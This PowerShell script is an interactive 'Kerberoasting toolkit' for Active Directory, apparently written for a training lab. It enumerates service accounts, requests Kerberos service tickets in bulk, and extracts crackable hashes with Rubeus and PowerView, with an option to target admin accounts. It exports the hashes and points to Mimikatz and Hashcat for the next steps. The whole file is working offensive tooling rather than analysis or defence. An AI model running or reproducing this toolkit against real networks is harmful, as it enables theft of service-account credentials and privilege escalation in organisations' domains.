# Comprehensive Kerberoasting Toolkit
# Includes all methods: setspn, PowerView, Rubeus, and manual techniques

function Show-Menu {
    Clear-Host
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host "           KERBEROASTING TOOLKIT" -ForegroundColor Cyan
    Write-Host "==================================================" -ForegroundColor Cyan
    Write-Host ""
    Write-Host "1. Manual SPN Enumeration (setspn.exe)" -ForegroundColor Yellow
    Write-Host "2. PowerView SPN Enumeration" -ForegroundColor Yellow
    Write-Host "3. Request TGS Tickets (Manual Method)" -ForegroundColor Yellow
    Write-Host "4. Extract All Tickets with setspn" -ForegroundColor Yellow
    Write-Host "5. Rubeus Kerberoasting" -ForegroundColor Red
    Write-Host "6. PowerView Kerberoasting" -ForegroundColor Red
    Write-Host "7. Export All Tickets to CSV" -ForegroundColor Green
    Write-Host "8. Exit" -ForegroundColor Gray
    Write-Host ""
}

function Invoke-SPNEnumeration {
    Write-Host "`n[*] Enumerating SPNs with setspn.exe..." -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow
    
    # First, show the raw setspn output
    $rawOutput = setspn.exe -Q */* 2>$null
    Write-Host $rawOutput -ForegroundColor White
    
    Write-Host "`n[*] Filtering for user/service accounts..." -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow
    
    $userSPNs = @()
    $currentUser = ""
    
    foreach ($line in $rawOutput) {
        if ($line -match "^CN=([^,]+),CN=Users") {
            $currentUser = $matches[1]
        }
        elseif ($line -match "^CN=([^,]+),OU=.*Service Accounts") {
            $currentUser = $matches[1]
        }
        elseif ($line -match "^\s+([^/]+/[^:\s]+(:[0-9]+)?)") {
            $SPN = $matches[1].Trim()
            if ($currentUser -and $currentUser -notlike "krbtgt" -and $currentUser -notlike "*ACADEMY*" -and $currentUser -notlike "*DC01*" -and $currentUser -notlike "*MS01*" -and $currentUser -notlike "*MX01*" -and $currentUser -notlike "*WS01*" -and $currentUser -notlike "*CTX1*" -and $currentUser -notlike "*FILE*" -and $currentUser -notlike "*DB01*" -and $currentUser -notlike "*CA01*") {
                $userSPNs += @{
                    User = $currentUser
                    SPN = $SPN
                }
                Write-Host "User: $currentUser" -ForegroundColor Cyan
                Write-Host "SPN: $SPN" -ForegroundColor Green
                Write-Host ""
            }
        }
        elseif ($line -match "^CN=") {
            $currentUser = ""
        }
    }
    
    Write-Host "`n[*] Found $($userSPNs.Count) user/service account SPNs" -ForegroundColor Yellow
    return $userSPNs
}

function Invoke-PowerViewSPN {
    Write-Host "`n[*] Attempting PowerView SPN Enumeration..." -ForegroundColor Yellow
    try {
        # Try to import PowerView
        Import-Module .\PowerView.ps1 -ErrorAction Stop
        $spnUsers = Get-DomainUser * -SPN | Select-Object samaccountname, serviceprincipalname
        Write-Host "[+] PowerView SPN Enumeration Results:" -ForegroundColor Green
        $spnUsers | Format-Table -AutoSize
        return $spnUsers
    }
    catch {
        Write-Host "[!] PowerView not found or failed to load" -ForegroundColor Red
        Write-Host "[!] Make sure PowerView.ps1 is in the current directory" -ForegroundColor Red
        return $null
    }
}

function Invoke-ManualTGSRequest {
    Write-Host "`n[*] Step 1: Enumerating SPNs..." -ForegroundColor Yellow
    $spns = Invoke-SPNEnumeration
    if (-not $spns -or $spns.Count -eq 0) {
        Write-Host "[!] No user/service SPNs found" -ForegroundColor Red
        return
    }
    
    Write-Host "`n[*] Step 2: Select SPNs to target" -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow
    
    for ($i = 0; $i -lt $spns.Count; $i++) {
        Write-Host "$($i+1). User: $($spns[$i].User) | SPN: $($spns[$i].SPN)" -ForegroundColor Cyan
    }
    
    Write-Host "`nSelect option:" -ForegroundColor Yellow
    Write-Host "1. Request all SPNs"
    Write-Host "2. Request specific SPN"
    Write-Host "3. Request multiple SPNs"
    $choice = Read-Host "Choice (1-3)"
    
    # Load required assembly
    Add-Type -AssemblyName System.IdentityModel
    
    switch ($choice) {
        "1" {
            Write-Host "`n[*] Requesting TGS tickets for ALL SPNs..." -ForegroundColor Yellow
            foreach ($item in $spns) {
                try {
                    Write-Host "Requesting: $($item.SPN)" -ForegroundColor White
                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $item.SPN
                    Write-Host "  ✓ Success - Ticket ID: $($ticket.Id)" -ForegroundColor Green
                }
                catch {
                    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            }
        }
        "2" {
            $spnChoice = Read-Host "Enter SPN number (1-$($spns.Count))"
            $index = [int]$spnChoice - 1
            if ($index -ge 0 -and $index -lt $spns.Count) {
                $selectedSPN = $spns[$index].SPN
                try {
                    Write-Host "Requesting: $selectedSPN" -ForegroundColor White
                    $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $selectedSPN
                    Write-Host "  ✓ Success - Ticket ID: $($ticket.Id)" -ForegroundColor Green
                }
                catch {
                    Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
                }
            } else {
                Write-Host "[!] Invalid SPN number" -ForegroundColor Red
            }
        }
        "3" {
            $spnChoices = Read-Host "Enter SPN numbers (comma-separated, e.g., 1,3,5)"
            $numbers = $spnChoices -split ',' | ForEach-Object { $_.Trim() }
            
            Write-Host "`n[*] Requesting selected TGS tickets..." -ForegroundColor Yellow
            foreach ($num in $numbers) {
                $index = [int]$num - 1
                if ($index -ge 0 -and $index -lt $spns.Count) {
                    $selectedSPN = $spns[$index].SPN
                    try {
                        Write-Host "Requesting: $selectedSPN" -ForegroundColor White
                        $ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $selectedSPN
                        Write-Host "  ✓ Success - Ticket ID: $($ticket.Id)" -ForegroundColor Green
                    }
                    catch {
                        Write-Host "  ✗ Failed: $($_.Exception.Message)" -ForegroundColor Red
                    }
                } else {
                    Write-Host "[!] Invalid SPN number: $num" -ForegroundColor Red
                }
            }
        }
    }
    
    Write-Host "`n[*] Next Steps:" -ForegroundColor Yellow
    Write-Host "=============================================" -ForegroundColor Yellow
    Write-Host "1. Tickets are now in memory" -ForegroundColor White
    Write-Host "2. Extract with Mimikatz: 'kerberos::list /export'" -ForegroundColor White
    Write-Host "3. Extract with Rubeus: 'Rubeus.exe triage' or 'Rubeus.exe dump'" -ForegroundColor White
    Write-Host "4. Crack with Hashcat: 'hashcat -m 13100 ticket.hash rockyou.txt'" -ForegroundColor White
}

function Invoke-AllTicketsRequest {
    Write-Host "`n[*] Requesting TGS tickets for ALL SPNs (including computers)..." -ForegroundColor Yellow
    Write-Host "WARNING: This will request tickets for ALL accounts with SPNs!" -ForegroundColor Red
    
    $confirm = Read-Host "Continue? (y/N)"
    if ($confirm -ne 'y' -and $confirm -ne 'Y') {
        return
    }
    
    Add-Type -AssemblyName System.IdentityModel
    
    try {
        Write-Host "`n[*] Starting bulk ticket request..." -ForegroundColor Yellow
        setspn.exe -T $env:USERDNSDOMAIN -Q */* | Select-String '^CN' -Context 0,1 | ForEach-Object {
            $spn = $_.Context.PostContext[0].Trim()
            Write-Host "Requesting: $spn" -ForegroundColor White
            try {
                $null = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn
                Write-Host "  ✓ Success" -ForegroundColor Green
            }
            catch {
                Write-Host "  ✗ Failed" -ForegroundColor Red
            }
        }
    }
    catch {
        Write-Host "[!] Error: $_" -ForegroundColor Red
    }
}

function Invoke-RubeusKerberoast {
    Write-Host "`n[*] Rubeus Kerberoasting Options:" -ForegroundColor Yellow
    Write-Host "1. Basic kerberoast (all users)" -ForegroundColor White
    Write-Host "2. Kerberoast with stats" -ForegroundColor White
    Write-Host "3. Kerberoast admin accounts only" -ForegroundColor White
    Write-Host "4. Kerberoast with RC4 only (/tgtdeleg)" -ForegroundColor White
    Write-Host "5. Export to file" -ForegroundColor White
    Write-Host "6. Show Rubeus help" -ForegroundColor White
    
    $choice = Read-Host "`nSelect option (1-6)"
    
    if (Test-Path ".\Rubeus.exe") {
        switch ($choice) {
            "1" { 
                Write-Host "`n[*] Kerberoasting all users..." -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /nowrap 
            }
            "2" { 
                Write-Host "`n[*] Gathering kerberoasting stats..." -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /stats 
            }
            "3" { 
                Write-Host "`n[*] Kerberoasting admin accounts..." -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap 
            }
            "4" { 
                Write-Host "`n[*] Kerberoasting with RC4 only..." -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /tgtdeleg /nowrap 
            }
            "5" { 
                $file = Read-Host "Enter output filename"
                Write-Host "`n[*] Exporting to file: $file" -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /outfile:$file
            }
            "6" { 
                Write-Host "`n[*] Rubeus help:" -ForegroundColor Yellow
                .\Rubeus.exe kerberoast /? 
            }
        }
    } else {
        Write-Host "[!] Rubeus.exe not found in current directory" -ForegroundColor Red
        Write-Host "[!] Download from: https://github.com/GhostPack/Rubeus" -ForegroundColor Yellow
    }
}

function Invoke-PowerViewKerberoast {
    Write-Host "`n[*] Attempting PowerView Kerberoasting..." -ForegroundColor Yellow
    try {
        Import-Module .\PowerView.ps1 -ErrorAction Stop
        
        Write-Host "1. Roast specific user" -ForegroundColor White
        Write-Host "2. Roast all users" -ForegroundColor White
        $choice = Read-Host "`nSelect option (1-2)"
        
        switch ($choice) {
            "1" {
                $user = Read-Host "Enter username"
                Write-Host "`n[*] Kerberoasting user: $user" -ForegroundColor Yellow
                Get-DomainUser -Identity $user | Get-DomainSPNTicket -Format Hashcat
            }
            "2" {
                Write-Host "`n[*] Kerberoasting all users with SPNs..." -ForegroundColor Yellow
                Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat
            }
        }
    }
    catch {
        Write-Host "[!] PowerView not found or failed" -ForegroundColor Red
        Write-Host "[!] Make sure PowerView.ps1 is in the current directory" -ForegroundColor Yellow
    }
}

function Export-TicketsToCSV {
    Write-Host "`n[*] Exporting tickets to CSV..." -ForegroundColor Yellow
    try {
        Import-Module .\PowerView.ps1 -ErrorAction Stop
        $filename = Read-Host "Enter CSV filename (default: tickets.csv)"
        if (-not $filename) { $filename = "tickets.csv" }
        
        Write-Host "[*] Exporting to: $filename" -ForegroundColor Yellow
        Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv -Path $filename -NoTypeInformation
        Write-Host "[+] Tickets exported to: $filename" -ForegroundColor Green
        Write-Host "[+] Use 'Import-Csv $filename' to view the data" -ForegroundColor White
    }
    catch {
        Write-Host "[!] PowerView not found or failed" -ForegroundColor Red
        Write-Host "[!] Make sure PowerView.ps1 is in the current directory" -ForegroundColor Yellow
    }
}

# Main execution loop
do {
    Show-Menu
    $choice = Read-Host "`nSelect an option (1-8)"
    
    switch ($choice) {
        '1' { 
            $spns = Invoke-SPNEnumeration
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '2' { 
            $pvSPNs = Invoke-PowerViewSPN
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '3' { 
            Invoke-ManualTGSRequest
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '4' { 
            Invoke-AllTicketsRequest
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '5' { 
            Invoke-RubeusKerberoast
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '6' { 
            Invoke-PowerViewKerberoast
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '7' { 
            Export-TicketsToCSV
            Write-Host "`nPress any key to continue..." -ForegroundColor Gray
            $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
        }
        '8' { 
            Write-Host "Exiting..." -ForegroundColor Green
            return 
        }
        default { 
            Write-Host "Invalid option!" -ForegroundColor Red
            Start-Sleep -Seconds 2
        }
    }
} while ($true)
